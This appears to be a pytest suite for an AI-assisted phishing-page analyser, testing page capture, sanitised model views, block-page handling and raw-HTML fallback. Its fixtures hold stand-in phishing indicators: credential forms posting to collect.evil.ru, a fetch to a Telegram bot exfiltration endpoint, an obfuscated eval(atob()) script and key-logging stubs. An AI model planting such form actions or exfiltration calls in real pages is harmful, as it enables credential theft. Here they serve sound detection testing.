# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: MIT-0
import json

import pytest
from agent_fakes import (
    FakeAgentFactory,
    FakeBrowserClient,
    FakePage,
    FakePlaywright,
    FakeResponse,
    FakeResult,
    FakeS3,
)

from phish_agents.code_analyst import agent as code_agent
from phish_agents.code_analyst.capture import CodeCapture
from phish_agents.common import browser
from phish_agents.common.finding import FindingDraft, SignalDraft
from phish_agents.common.timing import CallRecorder

pytestmark = pytest.mark.usefixtures("public_dns")

DOM = {
    "forms": [
        {
            "action": "https://collect.evil.ru/p.php",
            "method": "post",
            "inputs": ["email", "password"],
        }
    ],
    "inline_scripts": ["eval(atob('ZG9jdW1lbnQ='))"],
    "script_srcs": ["https://cdn.evil.ru/k.js"],
    "iframes": [],
    "meta_refresh": None,
    "log": {
        "listeners": [{"type": "keydown", "target": "input[password]"}],
        "sinks": [{"kind": "fetch", "url": "https://api.telegram.org/bot1/sendMessage"}],
    },
}


def make_open_page(page, seen_init):
    pw = FakePlaywright(page)

    def open_page_fn(recorder, name, **kwargs):
        seen_init.append(kwargs.get("init_script"))
        return browser.open_page(
            recorder,
            name,
            client_factory=FakeBrowserClient,
            playwright_factory=lambda: pw,
            **kwargs,
        )

    return open_page_fn


def page_with_dom():
    return FakePage(
        final_url="https://paypal-verify.xyz/",
        evaluate_result=DOM,
        responses=[
            FakeResponse(
                200, "https://cdn.evil.ru/k.js", "script", "document.onkeydown=function(e){}"
            ),
        ],
    )


async def test_capture_collects_dom_scripts_network_and_injects_instrumentation():
    seen = []
    s3 = FakeS3()
    cap = CodeCapture(
        "https://paypal-verify.xyz",
        "scan-12345678",
        CallRecorder(),
        s3,
        "b",
        make_open_page(page_with_dom(), seen),
    )
    data = await cap.capture()
    assert "__phishLog" in seen[0]
    assert data["forms"][0]["action"] == "https://collect.evil.ru/p.php"
    assert {s["src"] for s in data["scripts"]} == {None, "https://cdn.evil.ru/k.js"}
    assert data["requests"][0]["resource_type"] == "script"
    assert "credential_form_off_domain" in {s["name"] for s in data["derived_signals"]}
    stored = json.loads(s3.objects["scans/scan-12345678/capture.json"]["Body"])
    assert stored["final_url"] == "https://paypal-verify.xyz/"
    view = cap.model_view(sanitize=False)
    assert view.startswith("<<<UNTRUSTED_PAGE_CONTENT>>>") and "telegram" in view


async def test_script_text_budget_is_enforced():
    big = "x" * 100_000
    page = FakePage(evaluate_result={**DOM, "inline_scripts": [big, big]})
    cap = CodeCapture(
        "https://a.com", "scan-12345678", CallRecorder(), FakeS3(), "b", make_open_page(page, [])
    )
    data = await cap.capture()
    assert sum(len(s["text"]) for s in data["scripts"]) <= 60_000


async def test_analyze_end_to_end():
    draft = FindingDraft(
        verdict="phishing",
        confidence=97,
        signals=[
            SignalDraft(
                name="telegram_bot_exfil", severity="critical", evidence="fetch to api.telegram.org"
            )
        ],
    )
    s3 = FakeS3()
    finding = await code_agent.analyze(
        "https://paypal-verify.xyz",
        "scan-12345678",
        s3=s3,
        agent_factory=FakeAgentFactory([FakeResult(draft)]),
        open_page_fn=make_open_page(page_with_dom(), []),
    )
    assert finding.agent == "code_analyst" and finding.verdict == "phishing"
    assert finding.artifacts == ["scans/scan-12345678/capture.json"]
    assert "scans/scan-12345678/findings/code_analyst.json" in s3.objects


async def test_sanitized_view_keeps_structure_and_strips_script_literals():
    cap = CodeCapture(
        "https://paypal-verify.xyz",
        "scan-12345678",
        CallRecorder(),
        FakeS3(),
        "b",
        make_open_page(page_with_dom(), []),
    )
    await cap.capture()
    view = cap.model_view(sanitize=True)
    body = view.split("<<<UNTRUSTED_PAGE_CONTENT>>>\n", 1)[1].split("\n<<<END_", 1)[0]
    data = json.loads(body.split("\n", 1)[1])
    assert data["forms"][0]["action"] == "https://collect.evil.ru/p.php"
    assert data["sinks"][0]["url"] == "https://api.telegram.org/bot1/sendMessage"
    inline = next(s for s in data["scripts"] if s["src"] is None)
    assert inline["text"] == "eval(atob(''))"


async def test_skip_list_matches_hostname_exactly_not_substring():
    bypass = [
        "https://googletagmanager.com.evil.ru/k.js",
        "https://evil.ru/code.jquery.com/k.js",
        "https://cdnjs.cloudflare.com/ajax/libs/jquery-steal/k.js",
    ]
    skipped = [
        "https://www.googletagmanager.com/gtag/js",
        "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js",
    ]
    page = FakePage(
        final_url="https://a.com/",
        evaluate_result={**DOM, "inline_scripts": [], "script_srcs": bypass + skipped},
        responses=[FakeResponse(200, u, "script", f"body of {u}") for u in bypass + skipped],
    )
    cap = CodeCapture(
        "https://a.com", "scan-12345678", CallRecorder(), FakeS3(), "b", make_open_page(page, [])
    )
    data = await cap.capture()
    texts = {s["src"]: s["text"] for s in data["scripts"]}
    for url in bypass:
        assert texts[url] == f"body of {url}", url
    for url in skipped:
        assert texts[url] == "", url


async def test_capture_includes_truncated_rendered_dom():
    from phish_agents.code_analyst import capture as capture_mod

    html = "<html><body><input type='hidden' name='victim_id' value='1'>" + "x" * 50_000
    page = FakePage(evaluate_result=DOM, content=html)
    cap = CodeCapture(
        "https://a.com", "scan-12345678", CallRecorder(), FakeS3(), "b", make_open_page(page, [])
    )
    data = await cap.capture()
    assert data["dom_html"].startswith("<html><body><input type='hidden' name='victim_id'")
    assert len(data["dom_html"]) == capture_mod.DOM_HTML_LIMIT


async def test_capture_keeps_scripts_fetched_but_removed_from_dom():
    removed = "https://cdn.evil.ru/removed.js"
    page = FakePage(
        evaluate_result=DOM,
        responses=[
            FakeResponse(200, "https://cdn.evil.ru/k.js", "script", "kept()"),
            FakeResponse(200, removed, "script", "stealKeys()"),
        ],
    )
    cap = CodeCapture(
        "https://a.com", "scan-12345678", CallRecorder(), FakeS3(), "b", make_open_page(page, [])
    )
    data = await cap.capture()
    by_src = {s["src"]: s for s in data["scripts"]}
    assert by_src[removed]["text"] == "stealKeys()" and by_src[removed]["in_dom"] is False
    assert by_src["https://cdn.evil.ru/k.js"]["in_dom"] is True


def test_prompt_lists_rendered_dom_field():
    assert "dom_html" in code_agent.PROMPT


async def test_binary_post_body_does_not_break_the_capture():
    # D8: request.post_data decodes as UTF-8 and raised on gzip beacons inside the
    # listener, which poisoned every later route call.
    class BinaryRequest:
        url, resource_type, method = "https://t.example/b", "xhr", "POST"
        post_data_buffer = b"\x1f\x8b"
        redirected_from = None

        @property
        def post_data(self):
            raise UnicodeDecodeError("utf-8", b"\x1f\x8b", 1, 2, "invalid start byte")

    beacon = FakeResponse(200, "https://t.example/b", "xhr")
    beacon.request = BinaryRequest()
    page = page_with_dom()
    page._responses.append(beacon)
    cap = CodeCapture(
        "https://paypal-verify.xyz/",
        "scan-12345678",
        CallRecorder(),
        FakeS3(),
        "b",
        make_open_page(page, []),
    )
    data = await cap.capture()
    assert "error" not in data
    assert {
        "url": "https://t.example/b",
        "method": "POST",
        "resource_type": "xhr",
        "has_body": True,
    } in data["requests"]


async def test_code_capture_keeps_block_categories_apart():
    from playwright.async_api import Error

    page = FakePage(goto_error=Error("Page.goto: net::ERR_BLOCKED_BY_CLIENT at http://x.example/"))
    cap = CodeCapture(
        "http://x.example/",
        "scan-12345678",
        CallRecorder(),
        FakeS3(),
        "b",
        make_open_page(page, []),
    )
    data = await cap.capture()
    assert data["category"] == "blocked_by_browser"
    assert [(s.name, s.severity) for s in cap.signals()] == [("blocked_by_browser", "low")]
    assert cap.model_view(sanitize=False).startswith("blocked_by_browser")


async def test_code_capture_flags_a_403_block_page():
    page = FakePage(title="Access denied", status=403, evaluate_result=DOM)
    cap = CodeCapture(
        "https://walled.example/",
        "scan-12345678",
        CallRecorder(),
        FakeS3(),
        "b",
        make_open_page(page, []),
    )
    data = await cap.capture()
    assert "error" not in data
    assert [s.name for s in cap.signals()] == ["blocked_by_site"]


@pytest.mark.parametrize("agent", ["brand_visual", "code_analyst"])
def test_prompts_explain_the_three_block_categories(agent):
    from phish_agents.common.model import load_prompt

    prompt = load_prompt(f"phish_agents.{agent}")
    for name in ("blocked_by_browser", "blocked_by_guard", "blocked_by_site"):
        assert name in prompt
    assert "phishing evidence" not in prompt
    assert "`blocked_by_browser` is a capture gap" in prompt


async def test_code_capture_flags_a_404_page():
    page = FakePage(title="Not Found", status=404, evaluate_result=DOM)
    cap = CodeCapture(
        "https://gone.example/login",
        "scan-12345678",
        CallRecorder(),
        FakeS3(),
        "b",
        make_open_page(page, []),
    )
    data = await cap.capture()
    assert "error" not in data and "page_not_found" in data
    assert [s.name for s in cap.signals()] == ["page_not_found"]
    assert "page_not_found" in cap.model_view(sanitize=False)


@pytest.mark.parametrize("agent", ["brand_visual", "code_analyst"])
def test_prompts_tell_the_specialist_not_to_call_a_404_phishing(agent):
    from phish_agents.common.model import load_prompt

    prompt = load_prompt(f"phish_agents.{agent}")
    assert "page_not_found" in prompt and "error_404" in prompt


def test_browser_extension_scripts_are_skipped():
    from phish_agents.code_analyst.capture import skip_script

    assert skip_script("chrome-extension://pnbccbamcffpphfpnkpooldgbkoehjlb/public/rrweb.min.js")
    assert not skip_script("http://www.googletagmanager.com/gtm.js")
    assert not skip_script("https://kit.example/app.js")


# --- A page that cannot load: a bounded capture, then the raw HTML fallback ---------------

STATIC_PAGE = b"""<html><head><title>Roblox</title>
<script src="https://cdn.kit.example/k.js"></script>
<script>fetch('https://api.telegram.org/bot1/sendMessage')</script></head>
<body><form action="https://collect.evil.ru/p.php" method="POST">
<input type="email" name="u"><input type="password" name="p"></form>
<iframe src="/frame"></iframe></body></html>"""


def fake_probe(answer: dict | None = None, seen: list | None = None):
    async def probe(url, *, total_s, keep_body=False):
        if seen is not None:
            seen.append({"url": url, "total_s": total_s, "keep_body": keep_body})
        return {
            "outcome": "ok",
            "final_status": 200,
            "final_url": "https://lure.example/games/1",
            "hops": [url, "https://lure.example/games/1"],
            "reason": "HTTP 200",
            "body_bytes": len(STATIC_PAGE),
            "body": STATIC_PAGE,
            "content_type": "text/html; charset=utf-8",
            "cf_mitigated": "",
            **(answer or {}),
        }

    return probe


@pytest.fixture
def short_budget(monkeypatch):
    """The real budget scaled down, so a page that never loads costs about a second."""
    from phish_agents.code_analyst import capture

    monkeypatch.setattr(capture, "CAPTURE_BUDGET_S", 1.2)
    monkeypatch.setattr(capture, "HTML_FALLBACK_S", 0.6)
    monkeypatch.setattr(capture, "AFTER_NAV_S", 0.1)
    monkeypatch.setattr(capture, "_MIN_NAV_MS", 100)
    monkeypatch.setattr(capture, "_MIN_FALLBACK_S", 0.1)


@pytest.mark.parametrize("stuck", ["goto", "evaluate"])
async def test_a_page_that_never_loads_ends_inside_the_budget(short_budget, stuck):
    import time

    seen = []
    page = FakePage(final_url="https://lure.example/games/1", hang=frozenset({stuck}))
    cap = CodeCapture(
        "https://lure.example/games/1",
        "scan-12345678",
        CallRecorder(),
        FakeS3(),
        "b",
        make_open_page(page, []),
        http_probe_fn=fake_probe({"outcome": "unreachable", "body": b""}, seen),
    )
    started = time.monotonic()
    data = await cap.capture()
    assert time.monotonic() - started < 1.5
    assert data["category"] == "navigation_timeout" and data["reason"] == "capture_budget"
    # The fallback got what was left of the budget, never more.
    assert seen and seen[0]["keep_body"] and 0 < seen[0]["total_s"] <= 0.7
    assert "static_html" not in data and not cap.page_observed()
    assert cap.note() == "The page did not finish loading in time, so it was not captured."


async def test_a_capture_that_never_loads_still_gives_a_real_finding(short_budget):
    page = FakePage(hang=frozenset({"goto"}))
    factory = FakeAgentFactory(
        [FakeResult(FindingDraft(verdict="suspicious", confidence=40, signals=[]))]
    )
    finding = await code_agent.analyze(
        "https://lure.example/games/1",
        "scan-12345678",
        s3=FakeS3(),
        agent_factory=factory,
        open_page_fn=make_open_page(page, []),
        tools_factory=lambda: None,
    )
    assert finding.status == "ok" and finding.verdict == "suspicious"
    assert finding.page_observed is False
    assert factory.tool_outputs[0].startswith("capture_failed (navigation_timeout: capture_budget)")


async def test_raw_html_fallback_when_the_browser_cannot_load_the_page(short_budget):
    from playwright.async_api import TimeoutError as PlaywrightTimeout

    s3 = FakeS3()
    page = FakePage(goto_error=PlaywrightTimeout("Timeout 15000ms exceeded."))
    cap = CodeCapture(
        "https://lure.example/games/1",
        "scan-12345678",
        CallRecorder(),
        s3,
        "b",
        make_open_page(page, []),
        http_probe_fn=fake_probe(),
    )
    data = await cap.capture()
    static = data["static_html"]
    assert static["source"] == "raw HTML, not rendered, scripts not run"
    assert static["forms"] == [
        {
            "action": "https://collect.evil.ru/p.php",
            "method": "post",
            "inputs": ["email", "password"],
            "names": ["u", "p"],
        }
    ]
    assert static["script_srcs"] == ["https://cdn.kit.example/k.js"]
    assert static["inline_scripts"][0] == "fetch('https://api.telegram.org/bot1/sendMessage')"
    assert static["external_hosts"] == ["cdn.kit.example", "collect.evil.ru"]
    names = {s["name"] for s in static["derived_signals"]}
    assert {"credential_form_off_domain", "telegram_bot_exfil"} <= names
    # The rendered page was not seen: page_observed stays false, and code says so.
    assert not cap.page_observed() and cap.insights() is None
    assert [s.name for s in cap.signals()] == ["static_html_only"]
    assert "raw HTML was read instead" in cap.note()
    for sanitize in (False, True):
        view = cap.model_view(sanitize)
        assert view.startswith("navigation_timeout (timeout): the browser could not load")
        assert (
            "<<<UNTRUSTED_PAGE_CONTENT>>>\n[raw HTML excerpt, not rendered, scripts not run]"
            in view
        )
        assert "collect.evil.ru" in view
    stored = json.loads(s3.objects["scans/scan-12345678/capture.json"]["Body"])
    assert stored["static_html"]["final_url"] == "https://lure.example/games/1"
    assert cap.artifacts == ["scans/scan-12345678/capture.json"]


async def test_the_browser_refusal_also_falls_back_and_keeps_its_gap_signal(short_budget):
    from playwright.async_api import Error as PlaywrightError

    page = FakePage(goto_error=PlaywrightError("net::ERR_BLOCKED_BY_CLIENT at https://x"))
    cap = CodeCapture(
        "https://refused.example/",
        "scan-12345678",
        CallRecorder(),
        FakeS3(),
        "b",
        make_open_page(page, []),
        http_probe_fn=fake_probe(),
    )
    await cap.capture()
    assert [s.name for s in cap.signals()] == ["blocked_by_browser", "static_html_only"]


@pytest.mark.parametrize(
    "error",
    [
        "net::ERR_CERT_COMMON_NAME_INVALID at https://x",
        "net::ERR_NAME_NOT_RESOLVED at https://x",
        "net::ERR_BLOCKED_BY_RESPONSE at https://x",
        "net::ERR_ACCESS_DENIED at https://x",
    ],
)
async def test_no_raw_html_fallback_for_tls_dead_hosts_site_blocks_or_our_guard(
    short_budget, error
):
    from playwright.async_api import Error as PlaywrightError

    seen = []
    cap = CodeCapture(
        "https://tls.example/",
        "scan-12345678",
        CallRecorder(),
        FakeS3(),
        "b",
        make_open_page(FakePage(goto_error=PlaywrightError(error)), []),
        http_probe_fn=fake_probe(seen=seen),
    )
    data = await cap.capture()
    assert seen == [] and "static_html" not in data


@pytest.mark.parametrize(
    "answer",
    [
        # Cloudflare's own warning page: its HTML is the warning, not the site.
        {"body": b"<title>Suspected phishing site | Cloudflare</title>", "final_status": 403},
        {"body": b"<title>Suspected Malware | Cloudflare</title>"},
        # Bot checks, by title or by Cloudflare's challenge header.
        {"body": b"<title>Just a moment...</title><form action='/x'></form>"},
        {"cf_mitigated": "challenge"},
        {"body": b"<title>EggyWall</title>"},
        # Not a page of HTML, or not a page at all.
        {"content_type": "application/javascript"},
        # No declared type: not parsed as HTML.
        {"content_type": ""},
        {"outcome": "error_404", "final_status": 404},
        {"outcome": "blocked", "final_status": None},
        {"body": b""},
    ],
)
def test_static_excerpt_refuses_block_pages_and_non_html(answer):
    from phish_agents.code_analyst import static_html

    probe = {
        "outcome": "ok",
        "final_status": 200,
        "final_url": "https://a.example/",
        "hops": ["https://a.example/"],
        "body": STATIC_PAGE,
        "content_type": "text/html",
        "cf_mitigated": "",
        **answer,
    }
    assert static_html.excerpt(probe) is None


def test_static_excerpt_is_bounded():
    from phish_agents.code_analyst import static_html

    blob = "x" * 50_000
    page = ("<script>" + blob + "</script>") * 30 + "<input type=password>" * 100
    out = static_html.excerpt(
        {
            "outcome": "ok",
            "final_status": 200,
            "final_url": "https://a.example/",
            "body": page.encode(),
            "content_type": "text/html",
        }
    )
    assert sum(len(s) for s in out["inline_scripts"]) <= static_html.INLINE_TOTAL_LIMIT
    assert all(len(s) <= static_html.INLINE_SCRIPT_LIMIT for s in out["inline_scripts"])
    assert len(out["inputs_outside_forms"]) == static_html.MAX_INPUTS


def padded_probe(page: str) -> dict:
    return {
        "outcome": "ok",
        "final_status": 200,
        "final_url": "https://lure.example/login",
        "body": page.encode(),
        "content_type": "text/html",
    }


def test_static_excerpt_leads_with_signals_from_the_whole_page_and_counts_what_it_cut():
    from phish_agents.code_analyst import static_html

    decoys = "<form action='/search'><input type=text name=q></form>" * 25
    filler = "<script>var a = 1;</script>" * 25
    page = (
        "<base href='https://collect.evil.example/kit/'>"
        + decoys
        + filler
        + "<script>fetch('https://api.telegram.org/bot1/sendMessage')</script>"
        + "<form action='p.php' method=post>"
        + "<input type=hidden name=h>" * 40
        + "<input type=password name=pw>"
        + "<button formaction='https://drop.other.example/x'>Go</button></form>"
    )
    out = static_html.excerpt(padded_probe(page))
    assert list(out)[:2] == ["derived_signals", "external_hosts"]
    names = {s["name"] for s in out["derived_signals"]}
    # The telegram script is past the inline caps, the form past the form cap: both counted.
    assert {"credential_form_off_domain", "telegram_bot_exfil"} <= names
    assert "api.telegram.org" not in json.dumps(out["inline_scripts"])
    # The password form comes first, its password input ahead of the hidden padding, and its
    # relative action resolves against <base href>, as the browser would post it.
    first = out["forms"][0]
    assert first["action"] == "https://collect.evil.example/kit/p.php"
    assert first["inputs"][0] == "password" and first["inputs_dropped"] == 11
    assert first["formactions"] == ["https://drop.other.example/x"]
    assert out["base_href"] == "https://collect.evil.example/kit/"
    assert {"collect.evil.example", "drop.other.example"} <= set(out["external_hosts"])
    assert out["dropped"]["forms"] == 26 - static_html.MAX_FORMS
    assert out["dropped"]["inline_scripts"] == 26 - static_html.MAX_INLINE_SCRIPTS


def test_a_formaction_off_domain_is_a_credential_form_off_domain():
    from phish_agents.code_analyst import static_html

    page = (
        "<form action='/login'><input type=password name=p>"
        "<input type=submit formaction='https://collect.evil.example/p'></form>"
    )
    out = static_html.excerpt(padded_probe(page))
    names = {s["name"] for s in out["derived_signals"]}
    assert "credential_form_off_domain" in names
    assert out["forms"][0]["action"] == "https://lure.example/login"


async def test_raw_html_alone_never_yields_legitimate(short_budget, monkeypatch):
    from playwright.async_api import TimeoutError as PlaywrightTimeout

    from phish_agents.code_analyst import capture

    monkeypatch.setattr(capture, "http_probe", fake_probe())
    signal = SignalDraft(name="static_html_only", severity="low", evidence="raw HTML only")
    factory = FakeAgentFactory(
        [FakeResult(FindingDraft(verdict="legitimate", confidence=60, signals=[signal]))]
    )
    finding = await code_agent.analyze(
        "https://lure.example/games/1",
        "scan-12345678",
        s3=FakeS3(),
        agent_factory=factory,
        open_page_fn=make_open_page(FakePage(goto_error=PlaywrightTimeout("Timeout")), []),
        tools_factory=lambda: None,
    )
    assert finding.verdict == "unknown" and finding.confidence == 60
    assert [s.evidence for s in finding.signals if s.name == "static_html_only"] == [
        "raw HTML only"
    ]
    assert "never return `legitimate` in this mode" in code_agent.PROMPT


async def test_a_good_capture_survives_a_slow_session_close(short_budget):
    import asyncio

    page = page_with_dom()
    pw = FakePlaywright(page)

    async def slow_close():
        # Past the browser part of the (scaled) budget, inside open_page's own close bound.
        await asyncio.sleep(0.8)

    pw.browser.close = slow_close

    def open_page_fn(recorder, name, **kwargs):
        return browser.open_page(
            recorder,
            name,
            client_factory=FakeBrowserClient,
            playwright_factory=lambda: pw,
            **kwargs,
        )

    cap = CodeCapture(
        "https://paypal-verify.xyz/", "scan-12345678", CallRecorder(), FakeS3(), "b", open_page_fn
    )
    data = await cap.capture()
    assert "error" not in data and cap.failure is None
    assert data["forms"][0]["action"] == "https://collect.evil.ru/p.php"


async def test_a_failed_upload_in_the_raw_html_fallback_keeps_the_result(short_budget):
    import threading

    from playwright.async_api import TimeoutError as PlaywrightTimeout

    on_loop = []

    class DownS3(FakeS3):
        def put_object(self, **kwargs):
            on_loop.append(threading.current_thread() is threading.main_thread())
            raise RuntimeError("s3 unavailable")

    cap = CodeCapture(
        "https://lure.example/games/1",
        "scan-12345678",
        CallRecorder(),
        DownS3(),
        "b",
        make_open_page(FakePage(goto_error=PlaywrightTimeout("Timeout")), []),
        http_probe_fn=fake_probe(),
    )
    data = await cap.capture()
    assert data["error"] == "capture_failed" and data["static_html"]["forms"]
    assert cap.artifacts == [] and [s.name for s in cap.signals()] == ["static_html_only"]
    # The blocking boto3 call ran in a worker thread, not on the event loop.
    assert on_loop == [False]


async def test_session_cleanup_is_bounded(monkeypatch):
    import asyncio
    import time

    monkeypatch.setattr(browser, "CLOSE_TIMEOUT_S", 0.1)
    pw = FakePlaywright(FakePage())

    async def stuck_close():
        await asyncio.Event().wait()

    pw.browser.close = stuck_close
    started = time.monotonic()
    async with browser.open_page(
        CallRecorder(),
        "code_analyst",
        client_factory=FakeBrowserClient,
        playwright_factory=lambda: pw,
    ):
        pass
    assert time.monotonic() - started < 1.0
    assert FakeBrowserClient.instances[-1].stopped


class _HangingScript(FakeResponse):
    """A script whose body never arrives (a streamed or long-polled response)."""

    async def text(self) -> str:
        import asyncio

        await asyncio.sleep(60)
        return ""


async def test_a_script_body_that_never_arrives_does_not_hold_the_capture():
    import time

    from phish_agents.code_analyst import capture as capture_mod

    page = FakePage(
        final_url="https://paypal-verify.xyz/",
        evaluate_result=DOM,
        responses=[
            FakeResponse(200, "https://cdn.evil.ru/k.js", "script", "document.onkeydown=1"),
            _HangingScript(200, "https://cdn.evil.ru/stream.js", "script"),
        ],
    )
    cap = CodeCapture(
        "https://paypal-verify.xyz",
        "scan-12345678",
        CallRecorder(),
        FakeS3(),
        "b",
        make_open_page(page, []),
    )
    started = time.monotonic()
    data = await cap.capture()
    elapsed = time.monotonic() - started
    assert cap.failure is None and data["forms"]
    assert elapsed < capture_mod.SCRIPT_BODIES_S + 1.5
    texts = {s["src"]: s["text"] for s in data["scripts"] if s["src"]}
    assert texts["https://cdn.evil.ru/k.js"] == "document.onkeydown=1"
    assert texts.get("https://cdn.evil.ru/stream.js", "") == ""


async def test_a_failed_capture_json_upload_keeps_a_live_capture():
    import threading

    on_loop = []

    class DownS3(FakeS3):
        def put_object(self, **kwargs):
            on_loop.append(threading.current_thread() is threading.main_thread())
            raise RuntimeError("s3 unavailable")

    cap = CodeCapture(
        "https://paypal-verify.xyz",
        "scan-12345678",
        CallRecorder(),
        DownS3(),
        "b",
        make_open_page(page_with_dom(), []),
    )
    data = await cap.capture()
    # capture.json is an artifact, not the result: the capture stands without it.
    assert "error" not in data and cap.failure is None and cap.artifacts == []
    assert data["forms"][0]["action"] == "https://collect.evil.ru/p.php"
    assert on_loop == [False]
